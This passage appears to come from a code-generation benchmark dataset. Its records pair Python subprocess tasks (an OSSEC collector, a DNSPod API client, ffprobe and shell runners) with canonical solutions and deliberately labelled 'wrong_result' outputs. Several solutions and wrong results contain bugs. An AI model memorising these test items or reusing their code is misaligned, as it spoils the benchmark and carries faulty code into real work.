    "wrong_result": "import subprocess\nfrom typing import List, Tuple\n\ndef run_cmd(command: List[str], verbose: bool = False) -> Tuple[bytes, bytes]:\n    process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)\n    stdout, stderr = [], []\n\n    while True:\n        output = process.stdout.readline()\n        errors = process.stderr.readline()\n        \n        if output == '' and errors == '' and process.poll() is not None:\n            break\n        \n        if output:\n            stdout.append(output.strip())\n            if verbose:\n                print(output.strip())\n        \n        if errors:\n            stderr.append(errors.strip())\n            if verbose:\n                print(errors.strip(), file=sys.stderr)\n\n    rc = process.poll()\n    stdout = '\\n'.join(stdout).encode()\n    stderr = '\\n'.join(stderr).encode()\n\n    if rc != 0:\n        raise Exception(f\"Command failed with return code {rc}: stdout={stdout.decode()}, stderr={stderr.decode()}\")\n\n    return stdout, stderr"
  },
  {
    "Task_id": 298,
    "Instruction": "Task Description: Implement a class to collect and analyze OSSEC (Open Source Host-based Intrusion Detection System) agent states using subprocess communication.\n\nClass Description: The OssecCollector class interacts with the OSSEC agent control utility to retrieve agent status information and parse the results into a structured format. It handles command execution with optional sudo privileges and processes the output to count agent states.\n\nAttributes:\n- bin_path: [str] - Path to the OSSEC agent_control binary (default: '/var/ossec/bin/agent_control')\n- use_sudo: [bool] - Flag indicating whether to use sudo for command execution (default: True)\n- sudo_cmd: [str] - Path to the sudo binary (default: '/usr/bin/sudo')\n\nMethods:\n- __init__(bin_path: str = '/var/ossec/bin/agent_control', use_sudo: bool = True, sudo_cmd: str = '/usr/bin/sudo') -> None - Initializes the collector with configuration paths\n- collect() -> dict - Executes the agent control command, processes the output, and returns a dictionary counting agent states by status\n\nThe implementation should use subprocess.PIPE for inter-process communication and handle potential execution errors appropriately.",
    "Canonical_solution": "import subprocess\nimport re\nfrom diamond.collector import str_to_bool\n\nclass OssecCollector:\n    def __init__(self, bin_path='/var/ossec/bin/agent_control', use_sudo=True, sudo_cmd='/usr/bin/sudo'):\n        self.bin_path = bin_path\n        self.use_sudo = use_sudo\n        self.sudo_cmd = sudo_cmd\n\n    def collect(self):\n        command = [self.bin_path, '-l']\n\n        if str_to_bool(self.use_sudo):\n            command.insert(0, self.sudo_cmd)\n\n        try:\n            p = subprocess.Popen(command, stdout=subprocess.PIPE)\n            res = p.communicate()[0]\n        except Exception as e:\n            raise Exception('Unable to exec cmd: %s, because %s' % (' '.join(command), str(e)))\n\n        if res == '':\n            raise Exception('Empty result from exec cmd: %s' % (' '.join(command)))\n\n        states = {}\n        for line in res.split(\"\\n\"):\n            if not line.startswith('   ID: '):\n                continue\n            fragments = line.split(',')\n            state = fragments[-1].lstrip()\n            if state not in states:\n                states[state] = 1\n            else:\n                states[state] += 1\n\n        return states",
    "Code_level": "Class-level",
    "FSMID_for_test": 76,
    "wrong_result": "```python\nimport subprocess\n\nclass OssecCollector:\n    def __init__(self, bin_path: str = '/var/ossec/bin/agent_control', use_sudo: bool = True, sudo_cmd: str = '/usr/bin/sudo') -> None:\n        self.bin_path = bin_path\n        self.use_sudo = use_sudo\n        self.sudo_cmd = sudo_cmd\n\n    def collect(self) -> dict:\n        command = [self.bin_path, '-l']\n        if self.use_sudo:\n            command.insert(0, self.sudo_cmd)\n\n        try:\n            result = subprocess.run(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, check=True)\n            output = result.stdout\n        except subprocess.CalledProcessError as e:\n            raise RuntimeError(f\"Failed to execute agent_control: {e.stderr}\")\n\n        state_counts = {}\n        for line in output.splitlines():\n            if line.startswith('Agent ID'):\n                parts = line.split()\n                state = parts[3]\n                if state in state_counts:\n                    state_counts[state] += 1\n                else:\n                    state_counts[state] = 1\n\n        return state_counts\n```"
  },
  {
    "Task_id": 30,
    "Instruction": "Task Description: Implement a Python class to interact with the DNSPod API for managing DNS records, including querying domain information, listing records, and updating DNS records.\n\nClass Description: DNSPodAPI is a class that provides methods to interact with DNSPod's API for DNS management. It handles authentication, request construction, and response processing for various DNS operations.\n\nAttributes:\n\nSITE: str - The DNSPod API endpoint (dnsapi.cn)\nMETHOD: str - Default HTTP method for requests (POST)\nTOKEN_PARAM: str - Parameter name for authentication token (login_token)\nDEFAULT: str - Default value for record line (\"\u9ed8\u8ba4\")\nLENGTH: str - Parameter name for response length (\"length\")\nID: str - DNSPod API token ID\nTOKEN: str - DNSPod API token key\nPROXY: str - Optional proxy server address\nTTL: int - Time-to-live value for DNS records\ndomain_list: dict - Cache of domain names and their IDs\nrecords: dict - Cache of DNS records organized by domain ID\nrecord_keys: tuple - Valid fields for DNS records\n\nMethods:\n\n__init__(token_id=None, token_key=None, proxy=None, ttl=None) -> None - Initializes the DNSPodAPI instance with authentication tokens and optional proxy/ttl settings.\n\nrequest(action, param=None, **params) -> dict - Makes an authenticated API request to the specified action with given parameters. Returns parsed JSON response or raises an exception on error.\n\nget_domain_info(domain) -> tuple - Splits a domain into its main and subdomain parts, returning the domain ID and subdomain.\n\nget_domain_id(domain) -> str - Retrieves and caches the ID for a given domain name.\n\nget_records(did, **conditions) -> dict - Retrieves DNS records for a domain ID that match given conditions (e.g., name, type).\n\nupdate_record(domain, value, record_type=\"A\") -> dict - Updates or creates a DNS record for the given domain with the specified value and record type.",
    "Canonical_solution": "from http.client import HTTPSConnection\nfrom urllib.parse import urlencode\nfrom json import loads as jsondecode\nfrom os import environ\n\nclass DNSPodAPI:\n    def __init__(self, token_id=None, token_key=None, proxy=None, ttl=None):\n        self.SITE = \"dnsapi.cn\"\n        self.METHOD = \"POST\"\n        self.TOKEN_PARAM = \"login_token\"\n        self.DEFAULT = \"\u9ed8\u8ba4\"\n        self.LENGTH = \"length\"\n        \n        self.ID = token_id\n        self.TOKEN = token_key\n        self.PROXY = proxy\n        self.TTL = ttl\n        self.domain_list = {}\n        self.records = {}\n        self.record_keys = (\"id\", \"name\", \"type\", \"line\", \"line_id\", \"enabled\", \"mx\", \"value\")\n\n    def request(self, action, param=None, **params):\n        if param:\n            params.update(param)\n        params = {k: v for k, v in params.items() if v is not None}\n        params.update({self.TOKEN_PARAM: \"%s,%s\" % (self.ID, self.TOKEN), 'format': 'json', self.LENGTH: \"3000\"})\n        \n        if self.PROXY:\n            conn = HTTPSConnection(self.PROXY)\n            conn.set_tunnel(self.SITE, 443)\n        else:\n            conn = HTTPSConnection(self.SITE)\n\n        conn.request(self.METHOD, '/' + action, urlencode(params), {\n            \"Content-type\": \"application/x-www-form-urlencoded\",\n            \"User-Agent\": \"DDNS/%s (ddns@newfuture.cc)\" % environ.get(\"DDNS_VERSION\", \"1.0.0\")\n        })\n        response = conn.getresponse()\n        res = response.read().decode('utf8')\n        conn.close()\n\n        if response.status < 200 or response.status >= 300:\n            raise Exception(res)\n        else:\n            data = jsondecode(res)\n            if not data:\n                raise Exception(\"empty response\")\n            elif data.get(\"status\", {}).get(\"code\") == \"1\":\n                return data\n            else:\n                raise Exception(data.get('status', {}))\n\n    def get_domain_info(self, domain):\n        domain_split = domain.split('.')\n        sub, did = None, None\n        main = domain_split.pop()\n        while domain_split:\n            main = domain_split.pop() + '.' + main\n            did = self.get_domain_id(main)\n            if did:\n                sub = \".\".join(domain_split) or '@'\n                break\n        return did, sub\n\n    def get_domain_id(self, domain):\n        if domain in self.domain_list:\n            return self.domain_list[domain]\n        else:\n            try:\n                info = self.request('Domain.Info', domain=domain)\n                did = info.get(\"domain\", {}).get(\"id\")\n                if did:\n                    self.domain_list[domain] = did\n                    return did\n            except Exception:\n                return None\n\n    def get_records(self, did, **conditions):\n        if did not in self.records:\n            self.records[did] = {}\n            data = self.request('Record.List', domain_id=did)\n            if data:\n                for record in data.get('records'):\n                    self.records[did][record[\"id\"]] = {\n                        k: v for (k, v) in record.items() if k in self.record_keys}\n\n        records = {}\n        for (rid, record) in self.records[did].items():\n            for (k, value) in conditions.items():\n                if record.get(k) != value:\n                    break\n            else:\n                records[rid] = record\n        return records\n\n    def update_record(self, domain, value, record_type=\"A\"):\n        domainid, sub = self.get_domain_info(domain)\n        if not domainid:\n            raise Exception(\"invalid domain: [ %s ] \" % domain)\n\n        records = self.get_records(domainid, name=sub, type=record_type)\n        result = {}\n        if records:\n            for (did, record) in records.items():\n                if record[\"value\"] != value:\n                    res = self.request('Record.Modify', \n                                     record_id=did, \n                                     record_line=record[\"line\"].replace(\"Default\", \"default\").encode(\"utf-8\"), \n                                     value=value, \n                                     sub_domain=sub, \n                                     domain_id=domainid, \n                                     record_type=record_type, \n                                     ttl=self.TTL)\n                    if res:\n                        self.records[domainid][did][\"value\"] = value\n                        result[did] = res.get(\"record\")\n                    else:\n                        result[did] = \"update fail!\\n\" + str(res)\n                else:\n                    result[did] = domain\n        else:\n            res = self.request(\"Record.Create\", \n                             domain_id=domainid, \n                             value=value,\n                             sub_domain=sub, \n                             record_type=record_type, \n                             record_line=self.DEFAULT, \n                             ttl=self.TTL)\n            if res:\n                did = res.get(\"record\")[\"id\"]\n                self.records[domainid][did] = res.get(\"record\")\n                self.records[domainid][did].update(\n                    value=value, sub_domain=sub, record_type=record_type)\n                result = res.get(\"record\")\n            else:\n                result = domain + \" created fail!\"\n        return result",
    "Code_level": "Class-level",
    "FSMID_for_test": 56,
    "wrong_result": "```python\nimport requests\n\nclass DNSPodAPI:\n    SITE = \"https://dnsapi.cn\"\n    METHOD = \"POST\"\n    TOKEN_PARAM = \"login_token\"\n    DEFAULT = \"\u9ed8\u8ba4\"\n    LENGTH = \"length\"\n    TTL = 600\n    record_keys = (\"sub_domain\", \"record_type\", \"value\", \"ttl\", \"record_line\")\n\n    def __init__(self, token_id=None, token_key=None, proxy=None, ttl=None):\n        self.ID = token_id\n        self.TOKEN = token_key\n        self.PROXY = proxy\n        if ttl is not None:\n            self.TTL = ttl\n        self.domain_list = {}\n        self.records = {}\n\n    def request(self, action, param=None, **params):\n        url = f\"{self.SITE}/{action}\"\n        params[self.TOKEN_PARAM] = f\"{self.ID},{self.TOKEN}\"\n        if param:\n            params.update(param)\n        response = requests.post(url, data=params, proxies={\"http\": self.PROXY, \"https\": self.PROXY} if self.PROXY else None)\n        response.raise_for_status()\n        return response.json()\n\n    def get_domain_info(self, domain):\n        parts = domain.split('.')\n        subdomain = '.'.join(parts[:-2]) if len(parts) > 2 else ''\n        main_domain = '.'.join(parts[-2:])\n        did = self.get_domain_id(main_domain)\n        return did, subdomain\n\n    def get_domain_id(self, domain):\n        if domain not in self.domain_list:\n            resp = self.request(\"Domain.List\")\n            for item in resp['domains']:\n                if item['name'] == domain:\n                    self.domain_list[domain] = item['id']\n                    break\n        return self.domain_list.get(domain)\n\n    def get_records(self, did, **conditions):\n        if did not in self.records:\n            resp = self.request(\"Record.List\", domain_id=did)\n            self.records[did] = {rec['id']: rec for rec in resp['records']}\n        filtered_records = {k: v for k, v in self.records[did].items() if all(v.get(key) == value for key, value in conditions.items())}\n        return filtered_records\n\n    def update_record(self, domain, value, record_type=\"A\"):\n        did, subdomain = self.get_domain_info(domain)\n        conditions = {\"sub_domain\": subdomain, \"record_type\": record_type}\n        records = self.get_records(did, **conditions)\n        if records:\n            record_id = next(iter(records))\n            return self.request(\"Record.Modify\", record_id=record_id, domain_id=did, **conditions, value=value, ttl=self.TTL)\n        else:\n            return self.request(\"Record.Create\", domain_id=did, **conditions, value=value, ttl=self.TTL)\n```"
  },
  {
    "Task_id": 301,
    "Instruction": "Task Description: Implement a class to monitor and collect statistics about Passenger application server processes, including memory usage, CPU usage, and queue statistics.\n\nClass Description: The PassengerProcessCommunicator class is designed to interact with Passenger application server processes to gather various performance metrics. It uses subprocess communication to execute system commands and parse their outputs.\n\nAttributes:\n- config: [dict] - A configuration dictionary containing settings like command paths and sudo usage flags.\n\nMethods:\n- get_passenger_memory_stats() -> [dict] - Collects memory statistics for Apache, Nginx, and Passenger processes. Returns a dictionary with process lists and total memory usage.\n- get_passenger_cpu_usage(dict_stats: dict) -> [float] - Calculates total CPU usage percentage for all Passenger-related processes. Takes a dictionary of process stats and returns the total CPU usage.\n- get_passenger_queue_stats() -> [dict] - Gathers queue statistics from Passenger status, including top-level and application queue sizes. Returns a dictionary with queue metrics.",
    "Canonical_solution": "import subprocess\nimport re\nimport os\nfrom diamond.collector import str_to_bool\n\nclass PassengerProcessCommunicator:\n    def __init__(self, config):\n        self.config = config\n\n    def get_passenger_memory_stats(self):\n        command = [self.config[\"passenger_memory_stats_bin\"]]\n        if str_to_bool(self.config[\"use_sudo\"]):\n            command.insert(0, self.config[\"sudo_cmd\"])\n\n        try:\n            proc1 = subprocess.Popen(command, stdout=subprocess.PIPE)\n            (std_out, std_err) = proc1.communicate()\n        except OSError:\n            return {}\n\n        if std_out is None:\n            return {}\n\n        dict_stats = {\n            \"apache_procs\": [],\n            \"nginx_procs\": [],\n            \"passenger_procs\": [],\n            \"apache_mem_total\": 0.0,\n            \"nginx_mem_total\": 0.0,\n            \"passenger_mem_total\": 0.0,\n        }\n        \n        re_colour = re.compile(\"\\x1B\\[([0-9]{1,3}((;[0-9]{1,3})*)?)?[m|K]\")\n        re_digit = re.compile(\"^\\d\")\n        \n        apache_flag = 0\n        nginx_flag = 0\n        passenger_flag = 0\n        for raw_line in std_out.splitlines():\n            line = re_colour.sub(\"\", raw_line)\n            if \"Apache processes\" in line:\n                apache_flag = 1\n            elif \"Nginx processes\" in line:\n                nginx_flag = 1\n            elif \"Passenger processes\" in line:\n                passenger_flag = 1\n            elif re_digit.match(line):\n                line_splitted = line.split()\n                if apache_flag == 1:\n                    dict_stats[\"apache_procs\"].append(line_splitted[0])\n                    dict_stats[\"apache_mem_total\"] += float(line_splitted[4])\n                elif nginx_flag == 1:\n                    dict_stats[\"nginx_procs\"].append(line_splitted[0])\n                    dict_stats[\"nginx_mem_total\"] += float(line_splitted[4])\n                elif passenger_flag == 1:\n                    dict_stats[\"passenger_procs\"].append(line_splitted[0])\n                    dict_stats[\"passenger_mem_total\"] += float(line_splitted[3])\n            elif \"Processes:\" in line:\n                passenger_flag = 0\n                apache_flag = 0\n                nginx_flag = 0\n\n        return dict_stats\n\n    def get_passenger_cpu_usage(self, dict_stats):\n        try:\n            proc1 = subprocess.Popen(\n                [\"top\", \"-b\", \"-n\", \"2\"],\n                stdout=subprocess.PIPE)\n            (std_out, std_err) = proc1.communicate()\n        except OSError:\n            return -1\n\n        re_lspaces = re.compile(\"^\\s*\")\n        re_digit = re.compile(\"^\\d\")\n        overall_cpu = 0\n        for raw_line in std_out.splitlines():\n            line = re_lspaces.sub(\"\", raw_line)\n            if not re_digit.match(line):\n                continue\n\n            line_splitted = line.split()\n            if line_splitted[0] in dict_stats[\"apache_procs\"]:\n                overall_cpu += float(line_splitted[8])\n            elif line_splitted[0] in dict_stats[\"nginx_procs\"]:\n                overall_cpu += float(line_splitted[8])\n            elif line_splitted[0] in dict_stats[\"passenger_procs\"]:\n                overall_cpu += float(line_splitted[8])\n\n        return overall_cpu\n\n    def get_passenger_queue_stats(self):\n        queue_stats = {\n            \"top_level_queue_size\": 0.0,\n            \"passenger_queue_size\": 0.0,\n        }\n\n        command = [self.config[\"passenger_status_bin\"]]\n        if str_to_bool(self.config[\"use_sudo\"]):\n            command.insert(0, self.config[\"sudo_cmd\"])\n\n        try:\n            proc1 = subprocess.Popen(command, stdout=subprocess.PIPE)\n            (std_out, std_err) = proc1.communicate()\n        except OSError:\n            return {}\n\n        if std_out is None:\n            return {}\n\n        re_colour = re.compile(\"\\x1B\\[([0-9]{1,3}((;[0-9]{1,3})*)?)?[m|K]\")\n        re_requests = re.compile(r\"Requests\")\n        re_topqueue = re.compile(r\"^top-level\")\n\n        gen_info_flag = 0\n        app_groups_flag = 0\n        for raw_line in std_out.splitlines():\n            line = re_colour.sub(\"\", raw_line)\n            if \"General information\" in line:\n                gen_info_flag = 1\n            if \"Application groups\" in line:\n                app_groups_flag = 1\n            elif re_requests.match(line) and re_topqueue.search(line):\n                line_splitted = line.split()\n                if gen_info_flag == 1 and line_splitted:\n                    queue_stats[\"top_level_queue_size\"] = float(line_splitted[5])\n            elif re_requests.search(line) and not re_topqueue.search(line):\n                line_splitted = line.split()\n                if app_groups_flag == 1 and line_splitted:\n                    queue_stats[\"passenger_queue_size\"] = float(line_splitted[3])\n\n        return queue_stats",
    "Code_level": "Class-level",
    "FSMID_for_test": 76,
    "wrong_result": "```python\nimport subprocess\n\nclass PassengerProcessCommunicator:\n    def __init__(self, config):\n        self.config = config\n\n    def get_passenger_memory_stats(self):\n        memory_stats = {}\n        try:\n            # Example command to get memory usage, replace with actual command\n            result = subprocess.run([self.config['ps_command'], '-o', 'pid,rss,cmd'], stdout=subprocess.PIPE)\n            processes = result.stdout.decode().split('\\n')[1:]  # Skip header\n            passenger_processes = [line for line in processes if 'Passenger' in line]\n            total_memory = sum(int(process.split()[1]) for process in passenger_processes)\n            memory_stats['processes'] = passenger_processes\n            memory_stats['total_memory'] = total_memory\n        except Exception as e:\n            print(f\"Error getting memory stats: {e}\")\n        return memory_stats\n\n    def get_passenger_cpu_usage(self, dict_stats):\n        total_cpu_usage = 0.0\n        try:\n            # Example command to get CPU usage, replace with actual command\n            result = subprocess.run([self.config['top_command'], '-bn1', '-p', ','.join(str(p.split()[0]) for p in dict_stats['processes'])], stdout=subprocess.PIPE)\n            cpu_lines = result.stdout.decode().split('\\n')[7:-1]  # Skip headers and footer\n            for line in cpu_lines:\n                cpu_usage = float(line.split()[8])\n                total_cpu_usage += cpu_usage\n        except Exception as e:\n            print(f\"Error getting CPU usage: {e}\")\n        return total_cpu_usage\n\n    def get_passenger_queue_stats(self):\n        queue_stats = {}\n        try:\n            # Example command to get queue stats, replace with actual command\n            result = subprocess.run([self.config['passenger_status_command']], stdout=subprocess.PIPE)\n            status_output = result.stdout.decode()\n            # Parse the output to extract queue sizes, example parsing logic needed\n            queue_stats['top_level_queue'] = int(status_output.split('Top-level queue size: ')[1].split()[0])\n            queue_stats['app_queue'] = int(status_output.split('Application queue size: ')[1].split()[0])\n        except Exception as e:\n            print(f\"Error getting queue stats: {e}\")\n        return queue_stats\n```"
  },
  {
    "Task_id": 306,
    "Instruction": "Task Description: Implement a class that interacts with partclone utility to retrieve and parse partition information from disk image files, handling potential compression and chaining multiple subprocesses together.\n\nClass Description: The Partclone class provides static methods for working with partclone disk images, particularly focused on extracting partition information through a chain of subprocess operations.\n\nMethods:\n\nMethod1: get_partclone_info_dict(abs_partclone_image_list: list, image_key: str, compression: str) -> dict - Retrieves partition information from partclone image files by executing a chain of subprocess commands (cat, decompression, and partclone.info). Returns a dictionary containing parsed partition information.\n\nInput:\n- abs_partclone_image_list: List of absolute paths to partclone image files\n- image_key: String identifier for the image\n- compression: String specifying compression type (used for decompression)\n\nOutput:\n- Dictionary containing parsed partition information, with 'filesystem' as a minimum key (set to \"<unknown>\" if parsing fails)\n\nMethod2: parse_partclone_info_output(output: str) -> dict - [Implied but not shown in code] Parses the output string from partclone.info command into a structured dictionary. This would be a helper method called by get_partclone_info_dict.\n\nInput:\n- output: String containing the raw output from partclone.info command\n\nOutput:\n- Dictionary containing structured partition information extracted from the output",
    "Canonical_solution": "import collections\nimport subprocess\n\nclass Partclone:\n    @staticmethod\n    def get_partclone_info_dict(abs_partclone_image_list, image_key, compression):\n        env = utility.Utility.get_env_C_locale()\n        proc = collections.OrderedDict()\n        cat_cmd_list = [\"cat\"] + abs_partclone_image_list\n        decompression_cmd_list = utility.Utility.get_decompression_command_list(compression)\n        partclone_info_cmd_list = [\"partclone.info\", \"--source\", \"-\"]\n        utility.Utility.print_cli_friendly(\"partclone \", [cat_cmd_list, decompression_cmd_list, partclone_info_cmd_list])\n        proc['cat_partclone' + image_key] = subprocess.Popen(cat_cmd_list, stdout=subprocess.PIPE, env=env,\n                                                                          encoding='utf-8')\n        proc['decompression' + image_key] = subprocess.Popen(decompression_cmd_list,\n                                                                          stdin=proc[\n                                                                              'cat_partclone' + image_key].stdout,\n                                                                          stdout=subprocess.PIPE, env=env, encoding='utf-8')\n        proc['partclone_info' + image_key] = subprocess.Popen(partclone_info_cmd_list,\n                                                                           stdin=proc[\n                                                                               'decompression' + image_key].stdout,\n                                                                           stdout=subprocess.PIPE,\n                                                                           stderr=subprocess.PIPE, env=env,\n                                                                           encoding='utf-8')\n        proc['cat_partclone' + image_key].stdout.close()  # Allow p1 to receive a SIGPIPE if p2 exits.\n        proc['decompression' + image_key].stdout.close()  # Allow p1 to receive a SIGPIPE if p2 exits.\n        output, err = proc['partclone_info' + image_key].communicate()\n        print(\"partclone_info: Exit output \" + str(output) + \"stderr \" + str(err))\n        partclone_info_dict = Partclone.parse_partclone_info_output(err)\n        if len(partclone_info_dict) == 0:\n            print(abs_partclone_image_list[0] + \": Could not read partclone info dict for \" + image_key + \". Treating it as a dd image.\")\n            partclone_info_dict['filesystem'] = \"<unknown>\"\n        return partclone_info_dict",
    "Code_level": "Class-level",
    "FSMID_for_test": 76,
    "wrong_result": "```python\nimport subprocess\nimport os\nimport gzip\n\nclass Partclone:\n    @staticmethod\n    def get_partclone_info_dict(abs_partclone_image_list: list, image_key: str, compression: str) -> dict:\n        info_dict = {}\n        try:\n            # Concatenate all parts of the image\n            with open(f\"{image_key}.img\", \"wb\") as outfile:\n                for img_path in abs_partclone_image_list:\n                    with open(img_path, \"rb\") as infile:\n                        outfile.write(infile.read())\n            \n            # Decompress the image if needed\n            if compression == \"gzip\":\n                with gzip.open(f\"{image_key}.img\", \"rb\") as f_in:\n                    with open(f\"{image_key}_decompressed.img\", \"wb\") as f_out:\n                        f_out.write(f_in.read())\n                image_file = f\"{image_key}_decompressed.img\"\n            else:\n                image_file = f\"{image_key}.img\"\n            \n            # Run partclone.info to get partition info\n            result = subprocess.run(\n                [\"partclone.info\", \"-s\", image_file],\n                capture_output=True,\n                text=True,\n                check=True\n            )\n            \n            # Parse the output\n            info_dict = Partclone.parse_partclone_info_output(result.stdout)\n        \n        except Exception as e:\n            print(f\"Error processing partclone image: {e}\")\n            info_dict['filesystem'] = \"<unknown>\"\n        \n        finally:\n            # Clean up temporary files\n            if os.path.exists(f\"{image_key}.img\"):\n                os.remove(f\"{image_key}.img\")\n            if os.path.exists(f\"{image_key}_decompressed.img\"):\n                os.remove(f\"{image_key}_decompressed.img\")\n        \n        return info_dict\n\n    @staticmethod\n    def parse_partclone_info_output(output: str) -> dict:\n        info_dict = {}\n        lines = output.splitlines()\n        for line in lines:\n            if \"File system:\" in line:\n                info_dict['filesystem'] = line.split(\":\")[1].strip()\n            elif \"Total bytes:\" in line:\n                info_dict['total_bytes'] = int(line.split(\":\")[1].strip().replace(\",\", \"\"))\n            elif \"Used bytes:\" in line:\n                info_dict['used_bytes'] = int(line.split(\":\")[1].strip().replace(\",\", \"\"))\n            # Add more fields as needed\n        return info_dict\n```"
  },
  {
    "Task_id": 310,
    "Instruction": "Task Description: Create a function that uses subprocess.Popen with pipes to execute ffprobe (a multimedia stream analyzer) on a specified file and return the output in JSON format.\n\nFunction Description: The function _probe executes ffprobe command-line tool to analyze a multimedia file, capturing its format and stream information. It uses subprocess.Popen with pipes to handle inter-process communication, converts the output to JSON, and handles errors if the process fails.\n\nInput:\n- filename: [str] - Path to the multimedia file to analyze\n- cmd: [str] (optional, default=\"ffprobe\") - Name/path of the ffprobe executable\n- timeout: [int/float] (optional) - Timeout in seconds for the subprocess\n- **kwargs: [dict] (optional) - Additional ffprobe command-line arguments\n\nOutput:\n- [dict] - Parsed JSON output containing multimedia file information\n- Raises ffmpeg.Error if the process returns a non-zero exit code (includes stderr in exception)",
    "Canonical_solution": "import json\nimport subprocess\nimport ffmpeg\n\ndef _probe(filename, cmd=\"ffprobe\", timeout=None, **kwargs):\n    \"\"\"Run ffprobe on the specified file and return a JSON representation of the output.\n\n    Raises:\n        :class:`ffmpeg.Error`: if ffprobe returns a non-zero exit code,\n            an :class:`Error` is returned with a generic error message.\n            The stderr output can be retrieved by accessing the\n            ``stderr`` property of the exception.\n    \"\"\"\n    args = [cmd, \"-show_format\", \"-show_streams\", \"-of\", \"json\"]\n    args += ffmpeg._utils.convert_kwargs_to_cmd_line_args(kwargs)\n    args += [filename]\n\n    p = subprocess.Popen(args, stdout=subprocess.PIPE, stderr=subprocess.PIPE)\n    communicate_kwargs = {}\n    if timeout is not None:\n        communicate_kwargs[\"timeout\"] = timeout\n    out, err = p.communicate(**communicate_kwargs)\n    if p.returncode != 0:\n        raise ffmpeg.Error(\"ffprobe\", out, err)\n    return json.loads(out.decode(\"utf-8\"))",
    "Code_level": "Function-level",
    "FSMID_for_test": 76,
    "wrong_result": "import subprocess\nimport json\n\nclass FFmpegError(Exception):\n    pass\n\ndef _probe(filename, cmd=\"ffprobe\", timeout=None, **kwargs):\n    args = [cmd, \"-v\", \"quiet\", \"-print_format\", \"json\", \"-show_format\", \"-show_streams\", filename]\n    args.extend([f\"-{key.replace('_', '-')}={value}\" for key, value in kwargs.items()])\n\n    try:\n        result = subprocess.run(args, stdout=subprocess.PIPE, stderr=subprocess.PIPE, timeout=timeout)\n        result.check_returncode()\n        return json.loads(result.stdout.decode('utf-8'))\n    except subprocess.CalledProcessError as e:\n        raise FFmpegError(f\"FFprobe error: {e.stderr.decode('utf-8')}\")\n    except subprocess.TimeoutExpired:\n        raise FFmpegError(\"FFprobe process timed out\")\n    except json.JSONDecodeError:\n        raise FFmpegError(\"Failed to decode JSON output from ffprobe\")"
  },
  {
    "Task_id": 311,
    "Instruction": "Task Description: Implement a set of utility functions for executing shell commands in Python using subprocess.PIPE for inter-process communication, with options for real-time output display and logging.\n\nFunction Description: The functions provide different ways to execute shell commands and handle their output:\n1. run_command - Executes a command and collects all output lines\n2. run_shell_display - Executes a command and displays output in real-time\n3. run_shell - Executes a command and logs output to a file\n\nInput:\n- For run_command: cmd [str] - The shell command to execute\n- For run_shell_display: cmd [str] - The shell command to execute\n- For run_shell: cmd [str] - The shell command to execute, log_file [str] - Path to log file\n\nOutput:\n- For run_command: [str] - Combined stdout/stderr output\n- For run_shell_display: None (output is displayed in real-time)\n- For run_shell: [bytes] - Raw command output (also written to log file)",
    "Canonical_solution": "import subprocess\n\ndef run_command(cmd):\n    p = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)\n    stdout = []\n    while True:\n        line = p.stdout.readline()\n        stdout.append(line)\n        print(line.decode(\"utf-8\"))\n        if line == \"\" and p.poll() != None:\n            break\n    return \"\".join(stdout)\n\ndef run_shell_display(cmd):\n    p = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)\n    while True:\n        out = p.stdout.read(1).decode(\"utf-8\")\n        if out == \"\" and p.poll() != None:\n            break\n        if out != \"\":\n            sys.stdout.write(out)\n            sys.stdout.flush()\n    return\n\ndef run_shell(cmd, log_file):\n    p = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)\n    (output, err) = p.communicate()\n    p.wait()\n    with open(log_file, \"a+\") as logfile:\n        logfile.write(output.decode(\"utf-8\") + \"\\n\")\n        logfile.write(err.decode(\"utf-8\") + \"\\n\")\n    return output",
    "Code_level": "Function-level",
    "FSMID_for_test": 76,
    "wrong_result": "import subprocess\n\ndef run_command(cmd):\n    result = subprocess.run(cmd, shell=True, text=True, capture_output=True, check=False)\n    return result.stdout + result.stderr\n\ndef run_shell_display(cmd):\n    process = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)\n    for line in process.stdout:\n        print(line, end='')\n\ndef run_shell(cmd, log_file):\n    with open(log_file, 'wb') as log:\n        process = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)\n        while True:\n            output = process.stdout.readline()\n            if output == b'' and process.poll() is not None:\n                break\n            if output:\n                log.write(output)\n    return process.stdout.read()"
  },
  {
    "Task_id": 313,
    "Instruction": "Task Description: Create a function that executes a system command in a specified working directory and handles the command's output and errors.\n\nFunction Description: The function `run_command` executes a given system command in a specified working directory using Python's `subprocess` module. It captures the command's standard output and error streams, decodes them, and prints them. If the command returns a non-zero exit code, it raises a `CalledProcessError`.\n\nInput:  \n- `command`: [str] - The system command to be executed.  \n- `working_dir`: [str] - The working directory where the command will be executed.  \n\nOutput:  \n- None (prints output/error messages directly). Raises `subprocess.CalledProcessError` if the command fails (non-zero exit code).",
    "Canonical_solution": "import os\nimport subprocess\nimport sys\n\ndef run_command(command, working_dir):\n    command_array = command.split(\" \")\n    process = subprocess.Popen(command_array, cwd=working_dir, stdout=subprocess.PIPE, stderr=subprocess.PIPE)\n    stdout, stderr = process.communicate()\n    if stdout:\n        print(stdout.decode('utf-8'))\n    if stderr:\n        print(stderr.decode('utf-8'), level=\"error\")\n    if process.returncode != 0:\n        raise subprocess.CalledProcessError(process.returncode, command)",
    "Code_level": "Function-level",
    "FSMID_for_test": 76,
    "wrong_result": "```python\nimport subprocess\n\ndef run_command(command, working_dir):\n    try:\n        result = subprocess.run(\n            command,\n            cwd=working_dir,\n            check=True,\n            stdout=subprocess.PIPE,\n            stderr=subprocess.PIPE,\n            text=True,\n            shell=True\n        )\n        print(\"Output:\")\n        print(result.stdout)\n    except subprocess.CalledProcessError as e:\n        print(\"Error:\")\n        print(e.stderr)\n        raise e\n```"
  },
  {
    "Task_id": 318,
